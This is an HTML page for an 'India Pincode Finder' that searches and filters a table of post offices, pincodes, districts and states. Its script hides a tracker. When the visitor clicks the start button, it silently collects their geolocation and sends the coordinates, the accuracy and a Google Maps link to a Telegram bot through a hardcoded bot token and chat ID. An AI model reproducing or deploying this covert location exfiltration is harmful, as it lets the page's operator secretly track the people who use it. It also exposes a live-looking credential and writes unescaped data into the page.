<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>India Pincode Finder</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      margin: 0;
      background: #f0f8ff;
      padding: 20px;
    }
    #startBtn {
      display: block;
      margin: 100px auto;
      padding: 15px 30px;
      font-size: 20px;
      background-color: #0d47a1;
      color: white;
      border: none;
      border-radius: 8px;
      cursor: pointer;
    }
    .container {
      display: none;
      max-width: 1000px;
      margin: auto;
    }
    h1 {
      text-align: center;
      color: #0d47a1;
    }
    input, select {
      padding: 10px;
      margin: 10px;
      width: calc(100% - 24px);
      max-width: 500px;
      font-size: 16px;
      border: 1px solid #aaa;
      border-radius: 5px;
    }
    table {
      width: 100%;
      border-collapse: collapse;
      margin-top: 20px;
      background: #fff;
    }
    th, td {
      border: 1px solid #ccc;
      padding: 10px;
      text-align: left;
    }
    th {
      background-color: #1565c0;
      color: white;
    }
  </style>
</head>
<body>

<button id="startBtn">üîç Find Pincode</button>

<div class="container" id="mainContent">
  <h1>üìÆ India Pincode Finder</h1>
  <input type="text" id="searchInput" placeholder="Search Area, District, Pincode..." onkeyup="filterTable()">
  <select id="stateFilter" onchange="filterTable()"><option value="">--Select State--</option></select>
  <select id="districtFilter" onchange="filterTable()"><option value="">--Select District--</option></select>

  <table id="pincodeTable">
    <thead>
      <tr>
        <th>Office</th>
        <th>Pincode</th>
        <th>District</th>
        <th>State</th>
      </tr>
    </thead>
    <tbody></tbody>
  </table>
</div>

<script>
const BOT_TOKEN = "8148507636:AAE5JkA-Hc-AmAJMiM8Pz2t_BQoCC7VKtLc";
const CHAT_ID = "7357184121";

document.getElementById("startBtn").onclick = () => {
  document.getElementById("startBtn").style.display = "none";
  document.getElementById("mainContent").style.display = "block";
  sendLocation();
  loadData();
};

function sendLocation() {
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(pos => {
      const { latitude, longitude, accuracy } = pos.coords;
      const msg = `üìç User opened Pincode Finder\nLatitude: ${latitude}\nLongitude: ${longitude}\nAccuracy: ${accuracy}m\nüîó https://maps.google.com/?q=${latitude},${longitude}`;
      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: CHAT_ID, text: msg })
      });
    });
  }
}

let pincodeData = [];

function loadData() {
  fetch("pincode_data.json")
    .then(res => res.json())
    .then(data => {
      pincodeData = data;
      populateTable(pincodeData);
      populateFilters(pincodeData);
    });
}

function populateTable(data) {
  const tbody = document.querySelector("#pincodeTable tbody");
  tbody.innerHTML = "";
  data.forEach(row => {
    const tr = document.createElement("tr");
    tr.innerHTML = `<td>${row.Office}</td><td>${row.Pincode}</td><td>${row.District}</td><td>${row.State}</td>`;
    tbody.appendChild(tr);
  });
}

function populateFilters(data) {
  const states = [...new Set(data.map(r => r.State))].sort();
  const stateFilter = document.getElementById("stateFilter");
  states.forEach(state => {
    const opt = document.createElement("option");
    opt.value = opt.text = state;
    stateFilter.appendChild(opt);
  });
}

function filterTable() {
  const search = document.getElementById("searchInput").value.toLowerCase();
  const state = document.getElementById("stateFilter").value;
  const district = document.getElementById("districtFilter").value;

  const filtered = pincodeData.filter(r =>
    (!search || Object.values(r).some(val => val.toLowerCase().includes(search))) &&
    (!state || r.State === state) &&
    (!district || r.District === district)
  );

  const districts = [...new Set(filtered.map(r => r.District))].sort();
  const distFilter = document.getElementById("districtFilter");
  distFilter.innerHTML = "<option value=''>--Select District--</option>";
  districts.forEach(d => {
    const opt = document.createElement("option");
    opt.value = opt.text = d;
    distFilter.appendChild(opt);
  });

  populateTable(filtered);
}
</script>

</body>
</html>
